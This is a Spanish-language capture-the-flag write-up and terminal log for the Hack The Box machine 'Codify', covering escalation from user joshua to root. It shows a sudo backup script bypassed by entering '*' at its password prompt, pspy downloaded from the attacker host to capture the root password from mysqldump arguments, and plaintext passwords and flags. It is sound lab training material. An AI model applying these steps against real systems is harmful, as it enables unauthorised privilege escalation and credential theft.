[sudo] password for joshua: spongebob1

Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

### Objetivo

Analizar el permiso `sudo` encontrado para `joshua` antes de ejecutar nada como `root`.

### Hechos verificados

`joshua` puede ejecutar como `root` este script:

```text
(root) /opt/scripts/mysql-backup.sh
```

También se confirma que `sudo` usa:

```text
use_pty
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

El hallazgo dominante ya no es la base SQLite ni SSH. A continuación es:

```text
sudo sobre script custom: /opt/scripts/mysql-backup.sh
```

### Suposiciones

El vector de escalada probablemente está dentro del propio script, no en `sudo` de forma genérica.

Antes de ejecutar el script, se necesita leer:

```text
propietario
permisos
contenido
variables
comparaciones de contraseña
comandos ejecutados como root
entradas controladas por el usuario
```

### Método

No se ejecuta todavía:

```bash
sudo /opt/scripts/mysql-backup.sh
```

Primero se inspecciona el script como fichero normal. Si es legible, se analiza su lógica. Si no es legible, se reevalúa la vía.

### Análisis

Este es el punto de escalada local esperado: un script propio ejecutable como `root`.

A continuación se revisa el script con detalle. En scripts de backup, los patrones peligrosos suelen encontrarse en:

```text
lectura de credenciales
comparaciones inseguras
uso de variables sin comillas
comandos que exponen argumentos
rutas escribibles
permisos finales sobre backups
```

Siguiente paso único: inspeccionar el script.

### Comandos

Ejecución como `joshua`:

```bash
ls -la /opt/scripts/mysql-backup.sh
file /opt/scripts/mysql-backup.sh
sed -n '1,220p' /opt/scripts/mysql-backup.sh
```

### Comprobaciones

Se registra la salida completa.

Interesa especialmente ver si aparecen cosas como:

```text
read -s -p
DB_PASS
USER_PASS
[[ ... == ... ]]
mysql
mysqldump
/root/.creds
chmod
chown
```

### Notas para el informe técnico

```md
### Enumeración sudo como joshua

Tras consolidar acceso SSH como `joshua`, se ejecutó `sudo -l` para revisar permisos de ejecución elevados.

La salida mostró que `joshua` podía ejecutar `/opt/scripts/mysql-backup.sh` como `root`. Al tratarse de un script custom, el siguiente paso no fue ejecutarlo directamente, sino revisar primero permisos, propietario y contenido para entender qué entradas controla el usuario y qué acciones realiza el script con privilegios elevados.
```

### Estado actual

```text
Hallazgo dominante: joshua puede ejecutar /opt/scripts/mysql-backup.sh como root.
Rama principal activa: escalada local Linux mediante análisis de script sudo.
Ramas secundarias: ninguna prioritaria.
Siguiente paso único: leer permisos y contenido del script.
```
### Ejecución

joshua@codify:~$ ls -la /opt/scripts/mysql-backup.sh
ls -la /opt/scripts/mysql-backup.sh
-rwxr-xr-x 1 root root 928 Nov  2  2023 /opt/scripts/mysql-backup.sh
joshua@codify:~$ file /opt/scripts/mysql-backup.sh
file /opt/scripts/mysql-backup.sh
/opt/scripts/mysql-backup.sh: Bourne-Again shell script, ASCII text executable
joshua@codify:~$ sed -n '1,220p' /opt/scripts/mysql-backup.sh
sed -n '1,220p' /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

### Objetivo

Analizar el fallo del script `mysql-backup.sh` y preparar la escalada a `root` sin ejecutar a ciegas.

### Hechos verificados

`joshua` puede ejecutar como `root`:

```text
/opt/scripts/mysql-backup.sh
```

El script es propiedad de `root` y ejecutable:

```text
-rwxr-xr-x 1 root root 928 Nov  2  2023 /opt/scripts/mysql-backup.sh
```

El script lee la contraseña real de MySQL desde:

```bash
/root/.creds
```

Luego pide una contraseña al usuario:

```bash
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
```

Y la compara así:

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
```

Después utiliza la contraseña real en comandos `mysql` y `mysqldump`:

```bash
-p"$DB_PASS"
```

### Suposiciones

La comparación es vulnerable porque en Bash, dentro de `[[ ... == ... ]]`, si el lado derecho no está correctamente tratado, puede comportarse como patrón.

Eso significa que si introduces:

```text
*
```

puede coincidir con cualquier contraseña.

Además, si el script continúa, la contraseña real de `/root/.creds` aparecerá como argumento de procesos `mysql` o `mysqldump`, visible temporalmente con una herramienta de process snooping como `pspy`.

### Método

La escalada tiene dos fases:

```text
1. Validar bypass de contraseña con *
2. Observar procesos mientras el script corre para capturar la contraseña real de root/MySQL
```

No basta con que el script diga `Password confirmed!`; eso solo confirma el bypass. La clave está en ver el valor real de `DB_PASS` cuando el script lanza `mysql` o `mysqldump`.

### Análisis

El fallo principal se encuentra en la comparación insegura de contraseña.

La línea crítica es:

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
```

Si introduces `*` como contraseña, Bash puede interpretarlo como patrón comodín y aceptar la comparación aunque no conozcas la contraseña real.

A continuación se valida con una prueba mínima.

### Comandos

Ejecución como `joshua`:

```bash
sudo /opt/scripts/mysql-backup.sh
```

Cuando aparezca el prompt:

```text
Enter MySQL password for root:
```

introducir solo:

```text
*
```

### Comprobaciones

Se registra la salida.

Se busca una de estas dos señales:

```text
Password confirmed!
```

o:

```text
Password confirmation failed!
```

Si sale `Password confirmed!`, el bypass está validado y el siguiente paso será preparar `pspy` para capturar la contraseña real.

### Notas para el informe técnico

```md
### Análisis del script sudo

El permiso sudo permitía ejecutar `/opt/scripts/mysql-backup.sh` como `root`. Al revisar el contenido del script se observó que la contraseña real de MySQL se leía desde `/root/.creds` y se almacenaba en la variable `DB_PASS`.

El usuario debía introducir una contraseña, almacenada en `USER_PASS`, que posteriormente se comparaba con `DB_PASS` mediante una condición Bash:

    [[ $DB_PASS == $USER_PASS ]]

Esta comparación es insegura porque puede permitir coincidencia por patrón. El carácter `*` puede actuar como comodín y hacer que la condición sea verdadera sin conocer la contraseña real.
```

### Estado actual

```text
Hallazgo dominante: comparación insegura en mysql-backup.sh.
Rama principal activa: escalada local mediante script sudo.
Ramas secundarias: ninguna prioritaria.
Siguiente paso único: ejecutar el script con sudo e introducir * para validar el bypass.
```
### Ejecución

joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *

Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
joshua@codify:~$

### Objetivo

Cerrar la validación del bypass y preparar la captura de la contraseña real usada por el script.

### Hechos verificados

El bypass con `*` funciona:

```text
Password confirmed!
```

El script continúa y ejecuta comandos MySQL como `root` usando la contraseña real leída de:

```text
/root/.creds
```

También queda verificado que esa contraseña se pasa por línea de comandos:

```text
mysql: [Warning] Using a password on the command line interface can be insecure.
mysqldump: [Warning] Using a password on the command line interface can be insecure.
```

### Suposiciones

La contraseña real aparecerá temporalmente en la lista de procesos mientras se ejecuten `mysql` o `mysqldump`.

La vía esperada a continuación es usar `pspy` desde una sesión y ejecutar el script desde otra.

### Método

Necesitas dos sesiones como `joshua`:

```text
Sesión 1: ejecutar pspy y observar procesos.
Sesión 2: ejecutar sudo /opt/scripts/mysql-backup.sh e introducir *.
```

### Análisis

Validado el fallo del script, el siguiente paso consiste en capturar la contraseña real.

Se usan dos sesiones SSH como `joshua`: una para `pspy` y otra para ejecutar el script.

### Comandos

En la máquina atacante, descarga `pspy` y sírvelo:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Codify

wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s -O pspy64s

python3 -m http.server 8082
```

En la sesión SSH de `joshua`, descarga y ejecuta `pspy`:

```bash
cd /tmp

wget http://10.10.15.26:8082/pspy64s -O pspy64s

chmod +x pspy64s

./pspy64s
```

Déjalo corriendo.

En otra sesión SSH como `joshua`, se ejecuta:

```bash
sudo /opt/scripts/mysql-backup.sh
```

Cuando solicite contraseña, introducir:

```text
*
```

### Comprobaciones

En la ventana de `pspy`, busca líneas que contengan:

```text
mysql
mysqldump
-p
```

La parte crítica será algo parecido a:

```text
-pCONTRASEÑA_REAL
```

Se registra la línea de `pspy` o directamente la contraseña que aparece después de `-p`.

### Notas para el informe técnico

```md
### Bypass de validación y exposición de credencial

Al ejecutar el script con `sudo`, se introdujo `*` como contraseña. La comparación insegura aceptó el valor como válido y el script continuó con el mensaje `Password confirmed!`.

Durante la ejecución, el propio cliente MySQL mostró advertencias indicando que se estaba usando una contraseña por línea de comandos. Esto confirmó que la contraseña real leída desde `/root/.creds` podía quedar expuesta temporalmente en la lista de procesos.

Para capturarla, se preparó `pspy` en una sesión SSH y se ejecutó el script vulnerable desde otra sesión.
```

### Estado actual

```text
Hallazgo dominante: bypass de contraseña confirmado en mysql-backup.sh.
Rama principal activa: captura de credencial real mediante observación de procesos.
Ramas secundarias: ninguna prioritaria.
Siguiente paso único: ejecutar pspy y volver a lanzar el script para capturar la contraseña.
```

### Ejecución

❯ cd /home/r4mon/pentest/targets/HTB/easy/Codify
❯ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s -O pspy64s
--2026-05-06 19:40:36--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
Resolviendo github.com (github.com)... 140.82.121.4
Conectando con github.com (github.com)[140.82.121.4]:443... conectado.
Petición HTTP enviada, esperando respuesta... 302 Found
Localización: https://release-assets.githubusercontent.com/github-production-release-asset/120821432/d54f2200-c51c-11e9-9594-737e4ba5e6fe?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-05-06T18%3A24%3A52Z&rscd=attachment%3B+filename%3Dpspy64s&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-05-06T17%3A24%3A20Z&ske=2026-05-06T18%3A24%3A52Z&sks=b&skv=2018-11-09&sig=FxsoAmYVqSRZAEba1MeufgYAMw77KMJ61JtPkSn4MpQ%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3ODA4OTUzNiwibmJmIjoxNzc4MDg5MjM2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.HaHTxeSEfUD3gdmWaVSEOD5ouCik3dOYU_WboUtwktE&response-content-disposition=attachment%3B%20filename%3Dpspy64s&response-content-type=application%2Foctet-stream [siguiendo]
--2026-05-06 19:40:36--  https://release-assets.githubusercontent.com/github-production-release-asset/120821432/d54f2200-c51c-11e9-9594-737e4ba5e6fe?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-05-06T18%3A24%3A52Z&rscd=attachment%3B+filename%3Dpspy64s&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-05-06T17%3A24%3A20Z&ske=2026-05-06T18%3A24%3A52Z&sks=b&skv=2018-11-09&sig=FxsoAmYVqSRZAEba1MeufgYAMw77KMJ61JtPkSn4MpQ%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3ODA4OTUzNiwibmJmIjoxNzc4MDg5MjM2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.HaHTxeSEfUD3gdmWaVSEOD5ouCik3dOYU_WboUtwktE&response-content-disposition=attachment%3B%20filename%3Dpspy64s&response-content-type=application%2Foctet-stream
Resolviendo release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Conectando con release-assets.githubusercontent.com (release-assets.githubusercontent.com)[185.199.110.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1156536 (1,1M) [application/octet-stream]
Grabando a: «pspy64s»

pspy64s                                                 100%[==============================================================================================================================>]   1,10M  --.-KB/s    en 0,08s

2026-05-06 19:40:37 (13,4 MB/s) - «pspy64s» guardado [1156536/1156536]

❯ python3 -m http.server 8082
Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...

joshua@codify:~$ cd /tmp
cd /tmp
joshua@codify:/tmp$ wget http://10.10.15.26:8082/pspy64s -O pspy64s
wget http://10.10.15.26:8082/pspy64s -O pspy64s
--2026-05-06 17:41:55--  http://10.10.15.26:8082/pspy64s
Connecting to 10.10.15.26:8082... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1156536 (1.1M) [application/octet-stream]
Saving to: ‘pspy64s’

pspy64s             100%[===================>]   1.10M  1.33MB/s    in 0.8s

2026-05-06 17:42:03 (1.33 MB/s) - ‘pspy64s’ saved [1156536/1156536]

joshua@codify:/tmp$ chmod +x pspy64s
chmod +x pspy64s
joshua@codify:/tmp$ ./pspy64s (se ejecuta, pero se omite la salida completa por extensión; solo interesa la línea donde aparece la contraseña)

# En otra terminal SSH como joshua:
❯ cd /home/r4mon/pentest/targets/HTB/easy/Codify
❯ ssh joshua@10.129.40.127
The authenticity of host '10.129.40.127 (10.129.40.127)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.40.127' (ED25519) to the list of known hosts.
joshua@10.129.40.127's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed May  6 05:47:58 PM UTC 2026

  System load:                      0.05029296875
  Usage of /:                       64.0% of 6.50GB
  Memory usage:                     27%
  Swap usage:                       0%
  Processes:                        245
  Users logged in:                  1
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.40.127
  IPv6 address for eth0:            dead:beef::a0de:adff:feb9:c667


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed May  6 17:19:17 2026 from 10.129.40.127

joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
[sudo] password for joshua:
Sorry, try again.
[sudo] password for joshua:
Sorry, try again.
[sudo] password for joshua:
sudo: 3 incorrect password attempts
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
[sudo] password for joshua:
Sorry, try again.
[sudo] password for joshua:
Enter MySQL password for root:
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
joshua@codify:~$

/05/06 17:47:58 CMD: UID=0    PID=2656   | bc
2026/05/06 17:47:58 CMD: UID=0    PID=2655   | /bin/sh /etc/update-motd.d/50-landscape-sysinfo
2026/05/06 17:47:58 CMD: UID=0    PID=2654   | /bin/sh /etc/update-motd.d/50-landscape-sysinfo
2026/05/06 17:47:58 CMD: UID=0    PID=2659   | /usr/bin/python3 /usr/bin/landscape-sysinfo
2026/05/06 17:47:58 CMD: UID=0    PID=2661   | /usr/bin/python3 /usr/bin/landscape-sysinfo
2026/05/06 17:47:58 CMD: UID=0    PID=2662   |
2026/05/06 17:47:58 CMD: UID=0    PID=2663   | /bin/sh /etc/update-motd.d/50-motd-news
2026/05/06 17:47:58 CMD: UID=0    PID=2667   | cut -c -80
2026/05/06 17:47:58 CMD: UID=0    PID=2666   | tr -d \000-\011\013\014\016-\037
2026/05/06 17:47:58 CMD: UID=0    PID=2665   | /bin/sh /etc/update-motd.d/50-motd-news
2026/05/06 17:47:58 CMD: UID=0    PID=2664   | /bin/sh /etc/update-motd.d/50-motd-news
2026/05/06 17:47:58 CMD: UID=0    PID=2669   | /bin/sh /etc/update-motd.d/90-updates-available
2026/05/06 17:47:58 CMD: UID=0    PID=2670   | cat /var/lib/update-notifier/updates-available
2026/05/06 17:47:58 CMD: UID=0    PID=2672   | grep -q -m 1 .
2026/05/06 17:47:58 CMD: UID=0    PID=2671   |
2026/05/06 17:47:58 CMD: UID=0    PID=2676   | run-parts --lsbsysinit /etc/update-motd.d
2026/05/06 17:47:58 CMD: UID=0    PID=2680   | cut -d  -f4
2026/05/06 17:47:58 CMD: UID=???  PID=2679   | ???
2026/05/06 17:47:58 CMD: UID=0    PID=2678   | /bin/sh /etc/update-motd.d/91-release-upgrade
2026/05/06 17:47:58 CMD: UID=0    PID=2677   | /bin/sh /etc/update-motd.d/91-release-upgrade
2026/05/06 17:47:58 CMD: UID=???  PID=2681   | ???
2026/05/06 17:47:58 CMD: UID=???  PID=2684   | ???
2026/05/06 17:47:58 CMD: UID=0    PID=2687   | find /var/lib/update-notifier/hwe-eol -newermt now-1 days
2026/05/06 17:47:58 CMD: UID=0    PID=2686   | /bin/sh /etc/update-motd.d/95-hwe-eol
2026/05/06 17:47:58 CMD: UID=0    PID=2689   | /bin/sh /etc/update-motd.d/97-overlayroot
2026/05/06 17:47:58 CMD: UID=0    PID=2688   | /bin/sh /etc/update-motd.d/97-overlayroot
2026/05/06 17:47:58 CMD: UID=0    PID=2691   | sort -r
2026/05/06 17:47:58 CMD: UID=0    PID=2690   | grep -E overlayroot|/media/root-ro|/media/root-rw /proc/mounts
2026/05/06 17:47:58 CMD: UID=0    PID=2692   | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot
2026/05/06 17:47:58 CMD: UID=0    PID=2696   | awk {print $1} /proc/uptime
2026/05/06 17:47:58 CMD: UID=0    PID=2695   | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot
2026/05/06 17:47:58 CMD: UID=1000 PID=2700   | sshd: joshua
2026/05/06 17:48:02 CMD: UID=1000 PID=2701   | sshd: joshua@pts/3
2026/05/06 17:48:02 CMD: UID=1000 PID=2702   | groups
2026/05/06 17:48:02 CMD: UID=1000 PID=2703   | /usr/bin/locale-check C.UTF-8
2026/05/06 17:48:02 CMD: UID=1000 PID=2704   | /bin/sh /usr/bin/lesspipe
2026/05/06 17:48:02 CMD: UID=1000 PID=2707   | dirname /usr/bin/lesspipe
2026/05/06 17:48:02 CMD: UID=1000 PID=2706   | /bin/sh /usr/bin/lesspipe
2026/05/06 17:48:02 CMD: UID=???  PID=2708   | ???
2026/05/06 17:49:33 CMD: UID=1000 PID=2710   | /usr/bin/python3 /usr/lib/command-not-found -- xterm
2026/05/06 17:49:33 CMD: UID=1000 PID=2709   | -bash
2026/05/06 17:49:36 CMD: UID=???  PID=2711   | ???
2026/05/06 17:49:52 CMD: UID=1000 PID=2713   | /usr/bin/python3 /usr/lib/command-not-found -- xport
2026/05/06 17:49:52 CMD: UID=1000 PID=2712   | -bash
2026/05/06 17:50:34 CMD: UID=1000 PID=2715   |
2026/05/06 17:51:32 CMD: UID=1000 PID=2718   | -bash
2026/05/06 17:53:28 CMD: UID=1000 PID=2719   | sudo /opt/scripts/mysql-backup.sh
2026/05/06 17:53:28 CMD: UID=0    PID=2720   | /bin/bash /opt/scripts/mysql-backup.sh
2026/05/06 17:53:28 CMD: UID=???  PID=2721   | ???
2026/05/06 17:53:39 CMD: UID=0    PID=2722   |
2026/05/06 17:53:39 CMD: UID=0    PID=2727   | /usr/bin/grep -Ev (Database|information_schema|performance_schema)
2026/05/06 17:53:39 CMD: UID=0    PID=2726   | /bin/bash /opt/scripts/mysql-backup.sh
2026/05/06 17:53:39 CMD: UID=0    PID=2725   | /bin/bash /opt/scripts/mysql-backup.sh
2026/05/06 17:53:39 CMD: UID=0    PID=2731   | /bin/bash /opt/scripts/mysql-backup.sh
2026/05/06 17:53:39 CMD: UID=0    PID=2730   | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 mysql
2026/05/06 17:53:39 CMD: UID=0    PID=2734   | /bin/bash /opt/scripts/mysql-backup.sh
2026/05/06 17:53:39 CMD: UID=0    PID=2733   | /bin/bash /opt/scripts/mysql-backup.sh
2026/05/06 17:53:40 CMD: UID=0    PID=2735   | /usr/bin/echo All databases backed up successfully!
2026/05/06 17:53:40 CMD: UID=0    PID=2736   | /bin/bash /opt/scripts/mysql-backup.sh
2026/05/06 17:53:40 CMD: UID=0    PID=2737   | /bin/bash /opt/scripts/mysql-backup.sh
2026/05/06 17:53:40 CMD: UID=0    PID=2738   | /usr/bin/chmod 774 -R /var/backups/mysql
2026/05/06 17:53:40 CMD: UID=???  PID=2739   | ???

### Objetivo

Usar la contraseña real capturada por `pspy` para escalar de `joshua` a `root`.

### Hechos verificados

`pspy` ha capturado la contraseña real usada por el script:

```text
/usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 mysql
```

Contraseña recuperada:

```text
kljh12k3jhaskjh12kjh3
```

El script se ejecutó como `root`:

```text
UID=0 | /bin/bash /opt/scripts/mysql-backup.sh
```

### Suposiciones

Esa contraseña no solo sirve para MySQL, sino que también puede reutilizarse como contraseña del usuario local `root`, tal como indica la cadena oficial de la máquina.

### Método

Validar reutilización de la contraseña con `su root`.

### Análisis

Con la contraseña recuperada, en la sesión SSH como `joshua` se ejecuta:

### Comandos

```bash
su root
```

Cuando solicite contraseña, introducir:

```text
kljh12k3jhaskjh12kjh3
```

Después, si la autenticación es correcta, se ejecuta:

```bash
whoami
id
hostname
pwd
cat /root/root.txt
```

### Comprobaciones

Se registra la salida desde `whoami` hasta `cat /root/root.txt`.

### Notas para el informe técnico

```md
### Captura de la contraseña real y escalada a root

Con `pspy` en ejecución, se lanzó de nuevo el script `/opt/scripts/mysql-backup.sh` desde otra sesión SSH como `joshua`. Al introducir `*` en el prompt interno del script, la comparación insegura permitió continuar la ejecución.

Durante el proceso, `pspy` capturó la llamada a `mysqldump`, donde la contraseña real aparecía expuesta en la línea de comandos mediante el parámetro `-p`.

La contraseña recuperada fue reutilizada para autenticarse como `root` mediante `su root`, completando la escalada de privilegios.
```

### Estado actual

```text
Hallazgo dominante: contraseña real capturada desde argumentos de mysqldump.
Rama principal activa: escalada final a root.
Ramas secundarias: ninguna.
Siguiente paso único: ejecutar su root y leer root.txt.
```
### Ejecución

joshua@codify:~$ su root
Password:
root@codify:/home/joshua# whoami
root
root@codify:/home/joshua# id
uid=0(root) gid=0(root) groups=0(root)
root@codify:/home/joshua# hostname
codify
root@codify:/home/joshua# pwd
/home/joshua
root@codify:/home/joshua# cat /root/root.txt
12366f1e417e8d87083a018e0ffdb931

### Objetivo

Cerrar la máquina **Codify** con trazabilidad técnica completa: acceso inicial, movimiento lateral y escalada a `root`.

### Hechos verificados

Acceso final como `root` confirmado:

```text
whoami -> root
id     -> uid=0(root) gid=0(root) groups=0(root)
host   -> codify
```

Flag de root leída correctamente:

```text
/root/root.txt -> 12366f1e417e8d87083a018e0ffdb931
```

Cadena completa validada:

```text
Node.js / Express
-> vm2 3.9.16
-> escape de sandbox
-> shell como svc
-> SQLite tickets.db
-> hash bcrypt de joshua
-> crackeo offline
-> SSH como joshua
-> sudo sobre mysql-backup.sh
-> bypass con *
-> pspy captura contraseña real
-> su root
-> root.txt
```

### Suposiciones

La máquina queda resuelta técnicamente.

Ya no quedan ramas activas necesarias para explotación.

Queda pendiente la reconstrucción del **MD final didáctico** con todo lo aprendido.

### Método

El cierre se apoya en tres fases claras:

```text
1. Foothold:
   escape de sandbox vm2 desde /editor.

2. Movimiento lateral:
   extracción de hash bcrypt desde tickets.db y acceso SSH como joshua.

3. Escalada:
   abuso de comparación insegura en script sudo y captura de credencial con pspy.
```

### Análisis

La máquina queda terminada.

Codify es una easy muy didáctica porque tiene una cadena limpia y bastante reutilizable:

```text
aplicación que ejecuta código
-> sandbox vulnerable
-> credenciales en base local
-> reutilización de contraseña
-> sudo mal diseñado
-> exposición de secretos por argumentos de proceso
```

La parte más importante para el aprendizaje no es solo que `vm2` fuese vulnerable, sino cómo se fue validando cada salto:

* primero se confirmó `/run` con código benigno;
* luego se comprobó que `child_process` estaba bloqueado;
* después se validó el escape;
* tras la shell se buscó un artefacto de aplicación;
* el hash se crackeó offline;
* SSH consolidó el acceso;
* `sudo -l` abrió la vía final;
* el script se leyó antes de explotarlo;
* `pspy` confirmó la contraseña real.

La secuencia deja una base documental sólida.

### Comandos

Comandos finales ejecutados con éxito:

```bash
su root
```

Contraseña usada:

```text
kljh12k3jhaskjh12kjh3
```

Validación:

```bash
whoami
id
hostname
pwd
cat /root/root.txt
```

Salida relevante:

```text
root
uid=0(root) gid=0(root) groups=0(root)
codify
/home/joshua
12366f1e417e8d87083a018e0ffdb931
```

### Comprobaciones

Criterios de cierre cumplidos:

```text
Foothold obtenido: sí, como svc.
Movimiento lateral: sí, como joshua por SSH.
User flag: sí.
Escalada a root: sí.
Root flag: sí.
Cadena reproducible: sí.
Hallazgos principales documentables: sí.
```

### Notas para el informe técnico

Bloque de cierre para el informe:

```md
### Cierre de la máquina

La escalada final se completó reutilizando la contraseña real capturada mediante `pspy` durante la ejecución del script `/opt/scripts/mysql-backup.sh`.

El script era ejecutable como `root` por el usuario `joshua` y contenía dos debilidades relevantes: una comparación insegura de contraseña mediante `[[ $DB_PASS == $USER_PASS ]]`, que permitió superar la validación introduciendo `*`, y el uso posterior de la contraseña real en comandos `mysql`/`mysqldump` mediante argumentos de línea de comandos.

Al observar los procesos con `pspy`, se capturó la contraseña real en el parámetro `-p` de `mysqldump`. Esa contraseña permitió autenticarse como `root` mediante `su root`.

Con acceso `root`, se confirmó el contexto privilegiado con `whoami` e `id`, y se leyó la flag final en `/root/root.txt`.

La máquina queda resuelta con una cadena completa:

`vm2 sandbox escape -> svc -> tickets.db -> hash bcrypt -> joshua SSH -> sudo script -> pspy -> root`.
```

### Estado actual

```text
Máquina: Codify
Estado: resuelta
Usuario inicial: svc
Usuario lateral: joshua
Usuario final: root
User flag: obtenida
Root flag: obtenida
Hallazgos principales: comparación insegura en script sudo, exposición de contraseña real por argumentos de proceso.```
